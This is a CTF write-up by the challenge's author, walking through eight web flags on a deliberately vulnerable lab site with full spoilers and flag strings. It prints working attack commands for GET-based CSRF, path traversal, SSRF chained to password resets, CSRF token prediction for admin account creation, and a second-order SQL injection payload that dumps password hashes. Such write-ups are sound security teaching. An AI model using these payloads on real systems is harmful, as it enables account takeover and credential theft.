---
Title: BSides 2026 CTF: Challenge 2 - Website Access
Date: 2026-03-12T12:00:00+10:00
Tags: ctf, cybersecurity, bsides2026, web-security, bsides
Author: dmoges
AuthorURL: https://dmoges.com
Category: dmoges
Status: published
Cover: /images/placeholder.jpg
---

This was the biggest challenge in terms of flag count - eight flags across easy, medium, and hard tiers. I wanted to build a realistic company website with layered vulnerabilities that rewarded both breadth (finding many issues) and depth (chaining exploits together).

## Challenge Details

**Difficulty**: Progressive (Easy -> Medium -> Hard)

**Category**: Web Application Security

## The Setup

With Ballarat Engineering Supplies identified in Challenge 1 as the front for the mining operation, you now need to break into their website and figure out who's behind it. The site is a functional company website running on Node.js with Express, a vanilla JavaScript frontend, and a SQLite database.

**This post contains full spoilers including flags and solutions.** If you want to try the challenges yourself first, the challenge environments are available in the [BSides Ballarat CTF git repo](https://github.com/bsides-ballarat/CTF2026-overview).

## Easy Tier (150 points)

These are the reconnaissance basics - the stuff any pentester does in the first five minutes.

### Flag 1: Staff Directory Oversharing (50 points)

**Flag**: `BSides2026{staff_directory_oversharing}`

The website has a staff page that shows names and roles. But the API behind it returns way more than the frontend displays.

```bash
curl -s http://localhost:8082/api/staff | jq .
```

The response includes a `_debug` object with the flag, plus an `X-Debug-Info` header. More importantly, it leaks internal details about every employee - hire dates, emails, internal notes. You'll spot that Trevor Blackwood was hired in August 2024 (suspiciously matching when the power anomalies started).

**How you'd know to try this**: Checking API endpoints directly is standard web recon. The frontend only shows a subset of the data, but APIs often return everything. Open DevTools, look at the network tab while the staff page loads, and you'll see the full response.

### Flag 2: Robots.txt Treasure Map (50 points)

**Flag**: `BSides2026{robots_txt_treasure_map}`

```bash
curl http://localhost:8082/robots.txt
```

The flag is sitting right there in a comment at the bottom. But the real value is the list of disallowed paths: `/maintenance-portal/`, `/api/admin/`, `/staff-internal/`. These tell you exactly where to look next.

```
User-agent: *
Disallow: /portal/
Disallow: /api/admin/
Disallow: /maintenance-portal/
...
# Development notes removed before production...
# Well, most of them. BSides2026{robots_txt_treasure_map}
```

**How you'd know to try this**: Checking robots.txt is literally step one in any web assessment. It's meant to tell search engines what not to index, but it also tells attackers where the interesting stuff is.

### Flag 3: Source Maps Tell Stories (50 points)

**Flag**: `BSides2026{sourcemaps_tell_stories}`

The site ships JavaScript source maps in production. These contain the original development source code, including comments that should never have made it to production:

```bash
curl -s http://localhost:8082/js/app.js.map | jq -r '.sourcesContent[]' | grep -i "bsides\|password\|TODO"
```

In the source you'll find:
```javascript
// TODO: Remove before prod
// Dev creds: t.blackwood / Warehouse2024!
// Trevor's notes: Underground access via badge 7429#
// IRC server: irc.underground-miners.com
```

**How you'd know to try this**: Check for `.map` files referenced in script tags, or look in DevTools → Sources tab. Developers often forget to remove source maps from production builds. You can also find references to `.map` files in the HTTP responses if you watch the network tab.

## Medium Tier (300 points)

Now you've got credentials and know where the interesting endpoints are. Time to exploit.

### Flag 4: GET-based CSRF (100 points)

**Flag**: `BSides2026{get_csrf_legacy_systems}`

The maintenance portal (found via robots.txt) has a password reset that accepts GET requests. That's a textbook CSRF vulnerability - state-changing operations should never use GET.

```bash
# First, login as Trevor to get a JWT
TOKEN=$(curl -s -X POST http://localhost:8082/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"t.blackwood","password":"Warehouse2024!"}' | jq -r '.token')

# Reset password via GET (this should never work!)
curl -H "Authorization: Bearer $TOKEN" \
  "http://localhost:8082/maintenance-portal/reset-password?user=t.blackwood&new=hacked123"
```

The response contains the flag. In a real attack, you'd craft a link like this and trick the target into clicking it while logged in - their password gets reset without them knowing.

**How you'd know to try this**: The robots.txt pointed you at `/maintenance-portal/`. When you visit it authenticated, you see the password reset form. Checking if it accepts GET is a standard test - just put the parameters in the URL instead of a POST body.

### Flag 5: Path Traversal Meets CSRF (150 points)

**Flag**: `BSides2026{path_traversal_meets_csrf}`

There's a staff endpoint that takes a `resource` parameter. It's meant to load things like `messages` or `inventory`, but it doesn't sanitise the path:

```bash
# Discover available resources
curl -H "Authorization: Bearer $TOKEN" \
  "http://localhost:8082/api/staff/view"
# Response: {"available_resources": ["messages", "inventory", "profile"]}

# Path traversal to admin audit log
curl -H "Authorization: Bearer $TOKEN" \
  "http://localhost:8082/api/staff/view?resource=admin/audit-log" | jq .
```

If the direct path doesn't work, try URL-encoded variants: `?resource=..%2Fadmin%2Faudit-log` or double-encoded `%2e%2e%2f`. The audit log reveals Trevor accessing "Underground Access Panel" at 1:45 AM and downloading emergency shutdown procedures - proof he's the insider.

**How you'd know to try this**: Any endpoint with a `resource` or `file` parameter is a path traversal candidate. The fact that the staff view lists specific resources suggests it's loading files or routes based on that parameter. Standard testing: try `../` sequences to escape the intended directory.

### Flag 6: Preview Feature SSRF (50 points)

**Flag**: `BSides2026{preview_feature_ssrf_lite}`

The site has a share/preview feature that fetches URLs server-side:

```bash
# Discover the endpoint
curl -H "Authorization: Bearer $TOKEN" \
  "http://localhost:8082/api/share"
# Response hints at URL parameter

# SSRF to access internal admin endpoint
curl -H "Authorization: Bearer $TOKEN" \
  "http://localhost:8082/api/share/preview?url=%2F..%2Fapi%2Fadmin%2Fusers" | jq .
```

This makes the server request internal resources on your behalf. You can even chain it with the password reset to bypass authorisation - the server makes the request, so the "staff can only reset own password" check doesn't apply:

```bash
PAYLOAD="%2F..%2Fmaintenance-portal%2Freset-password%3Fuser%3Dd.morrison%26new%3Dpwned"
curl -H "Authorization: Bearer $TOKEN" \
  "http://localhost:8082/api/share?url=$PAYLOAD"
```

**How you'd know to try this**: Any feature that fetches URLs server-side is an SSRF candidate. The error message from `/api/share` actually tells you it expects a URL parameter. Classic SSRF test: point it at internal endpoints you can't reach directly.

## Hard Tier (250 points)

### Flag 7: Chained CSRF with Token Prediction (150 points)

**Flag**: `BSides2026{csrf_chain_reaction}`

The CSRF tokens are generated with a predictable algorithm. If you grab a few tokens and decode them, the pattern becomes clear:

```bash
# Get a CSRF token
CSRF=$(curl -s -H "Authorization: Bearer $TOKEN" \
  "http://localhost:8082/api/auth/csrf-token" | jq -r '.csrf_token')

# Decode it
echo $CSRF | base64 -d
# Output: 3:1768383300000
# Pattern: userId:timestamp (rounded to nearest minute)
```

The timestamp is rounded to the nearest 60 seconds, which means you can predict the next token for any user. To get admin's token, just use user ID 1 with the current minute's timestamp:

```python
import base64, time
timestamp = (int(time.time() * 1000) // 60000) * 60000
admin_csrf = base64.b64encode(f"1:{timestamp}".encode()).decode()
```

With a predicted admin CSRF token, you can create a new admin account:

```bash
curl -X POST http://localhost:8082/api/admin/users/create \
  -H "Authorization: Bearer $ADMIN_JWT" \
  -H "Content-Type: application/json" \
  -d "{\"username\":\"attacker\",\"password\":\"Hacked123!\",\"role\":\"admin\",\"csrf_token\":\"$ADMIN_CSRF\"}"
```

**How you'd know to try this**: The frontend JavaScript (from the source maps) hints at token generation. When you decode a token from base64 and see `userId:timestamp`, the next step is obvious - check if the timestamp is predictable. Requesting multiple tokens and comparing them reveals the 60-second rounding.

### Flag 8: Second-Order SQL Injection (100 points)

**Flag**: `BSides2026{second_order_sqli_export}`

This is a two-phase attack. Data injected through the messaging system gets stored safely (parameterised INSERT), but when the admin export function pulls it back out for CSV generation, it's concatenated directly into a query.

**Step 1: Store the payload** (as Trevor):
```bash
curl -X POST http://localhost:8082/api/staff/messages \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "to_user_id": 1,
    "subject": "test'\'' UNION SELECT id,id,id,username,password_hash,0,email FROM users--",
    "body": "Important report attached."
  }'
```

**Step 2: Trigger the export** (as admin):
```bash
ADMIN_TOKEN=$(curl -s -X POST http://localhost:8082/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"m.chen","password":"Manager2018!Secure"}' | jq -r '.token')

curl -H "Authorization: Bearer $ADMIN_TOKEN" \
  "http://localhost:8082/api/admin/export/messages" > export.csv
```

The flag is in the `X-Flag` response header, and the CSV now contains all user password hashes from the UNION injection.

**How you'd know to try this**: Export functions are known weak points - they often build queries differently from the input path. If you've found SQL injection doesn't work on the message submission form (because it uses parameterised queries), try thinking about where that data gets used *later*. The admin export is a natural target.

**Alternative approach**: You can also use Burp Suite's repeater to test various injection payloads in the message subject field, then trigger the export to see if any execute. The key insight is testing the *output* path, not just the input.

## The Key Discovery: Trevor Blackwood

The most important thing you find in this challenge isn't any single flag - it's the insider. Through the staff directory, admin panels, and database access, you discover:

- **Trevor Blackwood**, Warehouse Coordinator
- Hired August 2024 (suspicious timing - matches when the power anomalies started)
- Email: t.blackwood@ballaratengineeringsupplies.com
- Password: `Warehouse2024!`
- Badge code: `7429#`

These credentials are needed for Challenge 3 (webmail access).

## Real-World Relevance

Every vulnerability in this challenge exists in real web applications. The easy tier is the reconnaissance basics that any pentester does first. The medium tier shows why CSRF protection needs to be thorough - GET-based state changes and SSRF are still depressingly common. And the hard tier demonstrates how vulnerabilities chain together, which is what makes real-world breaches so devastating.

Second-order SQL injection is particularly nasty because input validation at the point of entry passes fine. The injection only triggers when the data is used in a different context later - which makes it much harder to catch in testing.

## My thoughts

Building eight distinct vulnerabilities into a single cohesive website was the most time-consuming part of the CTF. Each vulnerability needed to be discoverable but not trivially obvious, and they needed to work independently so teams could find flags in any order within each tier.

The CSRF chain was probably the hardest flag to design. I needed the token prediction to be possible but not immediately obvious - it took several iterations to get the algorithm to a point where it was crackable with some analysis but not guessable by accident.

I'm happy with how the progressive difficulty worked out. Most teams grabbed at least the easy flags, and the hard tier separated the experienced teams from the rest.